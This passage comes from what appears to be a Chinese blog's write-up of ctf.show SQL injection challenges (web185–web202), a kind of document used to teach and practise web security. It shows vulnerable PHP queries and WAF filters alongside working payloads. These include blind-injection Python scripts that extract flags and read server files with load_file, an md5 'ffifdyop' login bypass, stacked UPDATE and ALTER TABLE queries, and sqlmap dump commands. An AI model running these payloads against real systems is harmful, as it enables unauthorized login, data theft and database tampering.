    else:
        for i in range(n - 1):
            str +&#x3D; &quot;+true&quot;
    return str
#把每一个字符转换成ascii码对应的数值
def change_str(s):
    str&#x3D;&quot;&quot;
    str+&#x3D;&quot;chr(&quot;+createNum(ord(s[0]))+&quot;)&quot;
    for i in s[1:]:
        str+&#x3D;&quot;,chr(&quot;+createNum(ord(i))+&quot;)&quot;
    return str

url &#x3D; &quot;http:&#x2F;&#x2F;c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080&#x2F;select-waf.php&quot;
str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;
flag &#x3D; &quot;ctfshow&quot;
for i in range(0,666):
    for j in str:
        result &#x3D; change_str(flag + j + &quot;%&quot;)
        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;.format(result)&#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;$user_count &#x3D; 43;&quot; in res.text:
            flag +&#x3D; j
            print(flag)
            if j&#x3D;&#x3D;&quot;&#125;&quot;:
                exit()
            break</code></pre>

<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;
  return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);
&#125;</code></pre>

<p>虽然多加了几个，但是上一题的脚本可以接着用</p>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>是登录页面，要求以admin的账户登录，但是对username的验证没法绕过，只能利用password的部分</p>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
  $sql &#x3D; &quot;select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;$password&#39;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">$username &#x3D; $_POST[&#39;username&#39;];
$password &#x3D; md5($_POST[&#39;password&#39;],true);

&#x2F;&#x2F;只有admin可以获得flag
if($username!&#x3D;&#39;admin&#39;)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;用户名不存在&#39;;
    die(json_encode($ret));
&#125;
  </code></pre>

<p>可以看到这里的password是md5的形式，而这里存在一个很特殊的字符串ffifdyop</p>
<pre class="language-none"><code class="language-none">md5(&quot;ffifdyop&quot;,true) &#x3D; &#39;or&#39;6]!r,b</code></pre>

<p>将这个放在密码里，整个查询语句就会被闭合</p>
<pre class="language-none"><code class="language-none">select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;&#39;or&#39;6]!r,b&#39;
也就是：
select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;&#39;or &#39;6]!r,b&#39;
也就是：
select count(*) from ctfshow_user where FALSE or TRUE
or的存在配合后面的TRUE就绕过了</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509221244579.png" alt="image-20220509221244579"></p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><pre class="language-none"><code class="language-none"> $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;;

&#x2F;&#x2F;密码判断
  if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));
    &#125;</code></pre>

<p>在where username=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来</p>
<p>而if($row[‘pass’]==intval($password)) 也是弱比较，查出来的也是字母开头的</p>
<p>所以payload为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;0&amp;password&#x3D;0</code></pre>

<p>但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用<code>||</code>运算符</p>
<pre class="language-none"><code class="language-none">username&#x3D;1||1&amp;password&#x3D;0</code></pre>

<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>先试一下上一题的payload，发现没成功，估计是数字开头的了，而题目提示flag在api/index.php里感觉就是利用load_file读文件了</p>
<p>load_file()，用法一般是select load_file(xxxx)</p>
<pre class="language-none"><code class="language-none">LOAD_FILE(file_name)： 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。

regexp： mysql中的正则表达式操作符
</code></pre>

<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;4&#x2F;15 22:14
# blog: www.wlhhlc.top
import requests
url &#x3D; &quot;http:&#x2F;&#x2F;e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot;
all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;
flag &#x3D; &quot;ctfshow&#123;&quot;

for i in range(200):
    for j in all_str:
        data &#x3D; &#123;
            &quot;username&quot;:&quot;if(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;)regexp(&#39;&#123;0&#125;&#39;),0,1)&quot;.format(flag + j),
            &#39;password&#39;:0
        &#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:
            flag +&#x3D;j
            print(flag)
            break
        if j&#x3D;&#x3D;&#39;&#125;&#39;:
            exit()</code></pre>

<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪</code></pre>

<p>盲注</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225707786.png" alt="image-20220509225707786"></p>
<p>底下这个图应该也用or测的，懒得再截图了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509225602279.png" alt="image-20220509225602279"></p>
<p>可以看到正确的时候返回密码错误，错误的时候返回用户名不存在，所以直接盲注就行了</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;6&#x2F;1 21:57
# blog: www.wlhhlc.top
import requests
url &#x3D; &quot;http:&#x2F;&#x2F;e4bfc493-4ed3-4091-99b3-e1770febcde1.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,
        &#39;password&#39;:123456&#125;
flag &#x3D; &#39;&#39;

for i in range(1,46):
    start &#x3D; 32
    end &#x3D; 127
    while start &lt; end:
        mid &#x3D; (start + end) &gt;&gt; 1
        #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;
        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;
        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:
            start &#x3D; mid +1
        else:
            end &#x3D; mid
    flag &#x3D; flag + chr(start)
    print(flag)</code></pre>

<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
  if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
      die(json_encode($ret));
  &#125;

    </code></pre>

<p>加了个过滤，ascii被过滤了，最简单的就是不用二分法直接遍历比较（</p>
<p>把ascii换成ord</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;6&#x2F;2 17:03
# blog: www.wlhhlc.top
import requests
url &#x3D; &quot;http:&#x2F;&#x2F;d0f3a387-5d85-4a5c-a4b8-2267077de55f.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
data &#x3D; &#123;&#39;username&#39;:&#39;&#39;,
        &#39;password&#39;:123456&#125;
flag &#x3D; &#39;&#39;

for i in range(1,46):
    start &#x3D; 32
    end &#x3D; 127
    while start &lt; end:
        mid &#x3D; (start + end) &gt;&gt; 1
        #取表名：payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        #取字段名：payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;&quot;
        payload &#x3D; &quot;select f1ag from ctfshow_fl0g&quot;
        data[&#39;username&#39;] &#x3D; f&quot;admin&#39; and if(ord(substr((&#123;payload&#125;), &#123;i&#125; , 1)) &gt; &#123;mid&#125;, 1, 2)&#x3D;1#&quot;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:
            start &#x3D; mid +1
        else:
            end &#x3D; mid
    flag &#x3D; flag + chr(start)
    print(flag)</code></pre>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
      die(json_encode($ret));
  &#125;</code></pre>

<p>ord ascii hex都被过滤了，所以还是直接遍历吧（</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;6&#x2F;2 17:03
# blog: www.wlhhlc.top
import requests
url &#x3D; &quot;http:&#x2F;&#x2F;185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
flag &#x3D; &quot;&quot;
all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;

for i in range(1,99):
    for j in all_str:
        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;
        username_data &#x3D; f&quot;admin&#39; and if(substr((&#123;payload&#125;), &#123;i&#125;, 1)regexp(&#39;&#123;j&#125;&#39;), 1, 0)&#x3D;1#&quot;
        data &#x3D; &#123;&#39;username&#39;: username_data,
                &#39;password&#39;: 1&#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:
            flag +&#x3D; j
            print(flag)
            break
        if j &#x3D;&#x3D; &quot;&#125;&quot;:
            exit()</code></pre>

<p>这里我觉得等于号没被过滤的话直接比较看起来会更简单一点</p>
<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
      die(json_encode($ret));
  &#125;</code></pre>

<p>substr也没了，这里可以用left、right、mid、locate、substring代替</p>
<pre class="language-none"><code class="language-none">left(&quot;abc&quot;,2)
返回从左边第一个开始两个字符&quot;ab&quot;</code></pre>

<pre class="language-none"><code class="language-none">locate(&quot;ab&quot;,&quot;abxx&quot;)
返回第一个参数在第二个参数中出现的位置，从1开始计数</code></pre>

<p>locate：</p>
<pre class="language-none"><code class="language-none">import time

import requests

url &#x3D; &quot;http:&#x2F;&#x2F;bd4fa184-8dec-427e-943d-762e0ed0deb9.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;
flagstr_full &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;
flagstr &#x3D; &quot;1234567890&#123;-&#125;abcdef&quot;
flag &#x3D; &quot;ctfshow&quot;
payload &#x3D; r&quot;&#39; or if(locate(&#39;&#123;&#125;&#39;,(select group_concat(f1ag) from ctfshow_flxg)),1,0) &#x3D;&#39;1&quot;

for i in range(60):
    for j in flagstr:
        tj &#x3D; flag+j
        data &#x3D; &#123;
            &quot;username&quot;:payload.format(tj),
            &quot;password&quot;:&quot;0&quot;
        &#125;
        res &#x3D; requests.post(url , data &#x3D; data)
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:
            flag +&#x3D; j
            print(flag)
        time.sleep(0.3)</code></pre>

<p>left：</p>
<pre class="language-none"><code class="language-none">import time

import requests

url &#x3D; &quot;http:&#x2F;&#x2F;328932d3-030e-460a-923e-6003243856d4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;
flagstr &#x3D; &quot;0123456789-&#125;qwertyuiopasdfghjklzxcvbnm&#123;,_&quot;
flag &#x3D; &quot;&quot;
payload &#x3D; r&quot;&#39; or if(left((select group_concat(f1ag) from ctfshow_flxg), &#123;&#125;)regexp(&#39;&#123;&#125;&#39;),1,0) &#x3D;&#39;1&quot;

for i in range(60):
    for j in flagstr:
        tj &#x3D; flag+j
        data &#x3D; &#123;
            &quot;username&quot;:payload.format(str(i),tj),
            &quot;password&quot;:&quot;0&quot;
        &#125;
        res &#x3D; requests.post(url , data &#x3D; data)
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:
            flag +&#x3D; j
            print(flag)
        time.sleep(0.3)</code></pre>

<p>还可以利用like的模糊匹配和regexp的正则</p>
<p>regexp正则：</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;6&#x2F;11 14:03
# blog: www.wlhhlc.top
import requests
url &#x3D; &quot;http:&#x2F;&#x2F;4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
flag &#x3D; &quot;&quot;
all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&#123;&#125;&quot;

for i in range(1,99):
    for j in all_str:
        #payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        #payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;&quot;
        payload &#x3D; &quot;select group_concat(f1ag) from ctfshow_flxg&quot;
        username_data &#x3D; &quot;admin&#39; and if((&#123;0&#125;)regexp(&#39;^&#123;1&#125;&#39;), 1, 0)&#x3D;1#&quot;.format(payload, flag + j)
        data &#x3D; &#123;&#39;username&#39;: username_data,
                &#39;password&#39;: 1&#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        #print(data)
        if &quot;密码错误&quot; in res.json()[&#39;msg&#39;]:
            flag +&#x3D; j
            print(flag)
            break
        if j &#x3D;&#x3D; &quot;&#125;&quot;:
            exit()</code></pre>

<p>like：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;618941b4-ab0f-43e2-83ce-01afe487708c.challenge.ctf.show&#x2F;api&#x2F;&quot;
flag &#x3D; &quot;&quot;
table &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&quot;

for i in range(1,99):
    for j in table:
        pay &#x3D; flag+j+&#39;%&#39;
        username_data &#x3D; f&quot;&#39; or if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;
        data &#x3D; &#123;&#39;username&#39;: username_data,
                &#39;password&#39;: 1&#125;
        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data).text
        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in r:
            flag +&#x3D; j
            print(flag)
            if j &#x3D;&#x3D; &quot;&#125;&quot;:
                exit()
            break</code></pre>

<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑reg</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
      die(json_encode($ret));
  &#125;</code></pre>

<p>like的模糊匹配，regexp的正则还有mid、locate之类的都能用</p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;密码检测
if(!is_numeric($password))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
  die(json_encode($ret));
&#125;

&#x2F;&#x2F;密码判断
if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  &#125;

&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
  if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
      die(json_encode($ret));
  &#125;</code></pre>

<p>这里是堆叠注入，在我还想爆字段的时候，大师傅们已经用update把密码改了直接登录了</p>
<p>UPDATE用法</p>
<pre class="language-none"><code class="language-none">UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值
Copy</code></pre>

<p>使用update修改密码</p>
<pre class="language-none"><code class="language-none">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre>

<p>不过试了一下发现好像也查不了字段，过滤的有点多，要查感觉只能盲注</p>
<p>payload</p>
<pre class="language-sq" data-language="sq"><code class="language-sq">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1</code></pre>



<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509232642673.png" alt="image-20220509232642673"></p>
<p>南方师傅和y4师傅都说因为<code>  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</code>这个语句没引号所以要用十六进制</p>
<p>所以他们的payload都是下面这种形式</p>
<pre class="language-none"><code class="language-none">payload&#x3D;&quot;0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;&quot;</code></pre>

<p>而我这里没有用十六进制而是0的原因在web188里</p>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
  die(json_encode($ret));
&#125;

if(strlen($username)&gt;16)&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;用户名不能超过16个字符&#39;;
  die(json_encode($ret));
&#125;

if($row[0]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;
&#125;
    </code></pre>

<p>限制了用户名长度，上一题的payload不能用了</p>
<p>这里好像是后端验证有问题，select没被过滤，所以可以构造payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;select(1)
password &#x3D; 1</code></pre>

<p>因为</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">select pass from ctfshow_user where username &#x3D; 0;</code></pre>

<p>显然不会成立，所以查询后会返回后面的语句结果，而select(1)返回的结果是1，所以这时只要密码是1就能登陆成功</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510112512012.png" alt="image-20220510112512012"></p>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
  die(json_encode($ret));
&#125;

if($row[0]&#x3D;&#x3D;$password)&#123;
    $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;
&#125;   </code></pre>

<p>select，update，set被过滤了</p>
<p>但是show没有，结合查询语句我们能知道表名是ctfshow_user</p>
<p>所以可以构造payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username &#x3D; 0;show tables
password &#x3D; ctfshow_user</code></pre>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>197的payload还能用</p>
<p>南方师傅还写了另一种思路</p>
<p>这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下</p>
<pre class="language-none"><code class="language-none">PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;6&#x2F;15 22:53
# blog: www.wlhhlc.top
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
payload &#x3D; &#39;0x61646d696e;alter table ctfshow_user change column &#96;pass&#96; &#96;dotast&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;dotast&#96; &#96;id&#96; varchar(255);&#39;
data1 &#x3D; &#123;
    &#39;username&#39;: payload,
    &#39;password&#39;: &#39;1&#39;
&#125;
res &#x3D; requests.post(url&#x3D;url, data&#x3D;data1)

for i in range(99):
    data2 &#x3D; &#123;
        &#39;username&#39;: &quot;0x61646d696e&quot;,
        &#39;password&#39;: f&#39;&#123;i&#125;&#39;
    &#125;
    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;data2)
    if &quot;flag&quot; in res2.json()[&#39;msg&#39;]:
        print(res2.json()[&#39;msg&#39;])
        break</code></pre>

<h2 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h2><p>web197的payload或者用198写的脚本</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>从这之后的几道题都是sqlmap的使用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Dome_/article/details/104337211">Sqlmap常见命令_K&#39;illCode的博客-CSDN博客</a></p>
<pre class="language-none"><code class="language-none">[ sqlmap最新版下载](https:&#x2F;&#x2F;ctfshow.lanzoui.com&#x2F;i4wlziac1de)

 使用--user-agent 指定agent

 使用--referer 绕过referer检查</code></pre>

<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
$sql &#x3D; &quot;select id,username,password from ctfshow_user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
      </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
  function waf($str)&#123;
   &#x2F;&#x2F;代码过于简单，不宜展示
  &#125;</code></pre>

<p>题目上都写了</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">使用--user-agent 指定agent

使用--referer 绕过referer检查</code></pre>

<p>抓一下包找到查询的api接口</p>
<p>然后referer要为ctf.show</p>
<pre class="language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot;  --referer&#x3D;&quot;http:&#x2F;&#x2F;929912ab-39c5-48ee-8cbe-bbc3e4562124.challenge.ctf.show&quot; --dump --batch --no-cast --
--dump             转储数据库表项,查询字段值-session</code></pre>

<pre class="language-txt" data-language="txt"><code class="language-txt">--no-cast  获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)

--dump             转储数据库表项,查询字段值

--batch		&#x2F;&#x2F;自动选择选项

--flush-session		sqlmap扫描的时候会将缓存的数据记录到output文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加--flush-session选项。</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510161320437.png" alt="image-20220510161320437"></p>
<p>如果是一步一步的查，那payload应该是</p>
<pre class="language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</code></pre>

<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><blockquote>
<p>使用--data 调整sqlmap的请求方式</p>
</blockquote>
<p>查询语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
